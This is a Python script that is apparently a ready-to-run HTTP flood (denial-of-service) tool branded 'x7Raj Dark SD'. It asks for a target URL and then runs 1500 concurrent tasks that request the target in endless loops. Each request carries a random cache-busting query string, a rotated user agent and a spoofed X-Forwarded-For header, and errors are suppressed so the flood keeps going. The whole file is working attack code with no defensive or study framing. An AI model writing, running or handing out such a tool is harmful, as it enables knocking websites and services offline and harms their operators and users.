import asyncio
import aiohttp
import random
import string
import sys
import time
import os

G = '\033[92m' # أخضر
B = '\033[1m'  # عريض
R = '\033[91m' # أحمر
Y = '\033[93m' # أصفر
E = '\033[0m'  # إنهاء

def print_banner():
    banner = f"""
{G}{B}
██╗  ██╗███████╗██████╗  █████╗      ██╗     ██████╗  █████╗ ██████╗ ██╗  ██╗
╚██╗██╔╝╚════██║██╔══██╗██╔══██╗     ██║     ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝
 ╚███╔╝     ██╔╝██████╔╝███████║     ██║     ██║  ██║███████║██████╔╝█████╔╝ 
 ██╔██╗    ██╔╝ ██╔══██╗██╔══██║     ██║     ██║  ██║██╔══██║██╔══██╗██╔═██╗ 
██╔╝ ██╗   ██║  ██║  ██║██║  ██║     ███████╗██████╔╝██║  ██║██║  ██║██║  ██╗
╚═╝  ╚═╝   ╚═╝  ╚═╝  ╚═╝╚═╝  ╚═╝     ╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
                                                                             
             >>> MISSION OPERATOR: x7Raj Dark SD <<<
             >>> STATUS: PERSISTENT STRIKE MODE <<<
             >>> SECURITY: SELF-DESTRUCT DISABLED <<<
{E}"""
    for char in banner:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.0005)

async def attack_node(session, url, id):
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ]
    
    while True:
        try:
            entropy = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            target_final = f"{url}?x7={entropy}"
            
            headers = {
                'User-Agent': random.choice(ua_list),
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Cache-Control': 'no-cache',
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }

            async with session.get(target_final, headers=headers, timeout=7) as resp:
                print(f"{G}[{time.strftime('%H:%M:%S')}] x7Raj-Strike-{id:03d} | Payload: ACTIVE | Status: {resp.status}{E}", end='\r')
                await resp.content.read(64) 
        except:
           
            await asyncio.sleep(0.01)

async def start_mission(target):
    intensity = 1500 
    
    print(f"\n{R}[!] TARGET LOCKED: {target}")
    print(f"[!] DEPLOYING {intensity} GHOST THREADS...{E}\n")
    time.sleep(1.5)

    connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [attack_node(session, target, i) for i in range(intensity)]
        await asyncio.gather(*tasks)

if __name__ == '__main__':
    try:
        print_banner()
        print(f"{Y}┌──(x7Raj Dark SD)-[Target Input]")
        target_input = input(f"└─$ {E}").strip()
        
        if target_input:
            if not target_input.startswith("http"):
                target_input = "http://" + target_input
            asyncio.run(start_mission(target_input))
        else:
            print(f"{R}[!] ERROR: TARGET REQUIRED.{E}")
    except KeyboardInterrupt:
        print(f"\n{Y}[!] MISSION PAUSED BY OPERATOR. DATA PERSISTED.{E}")
    except Exception as e:
        print(f"\n{R}[ERROR] {e}{E}")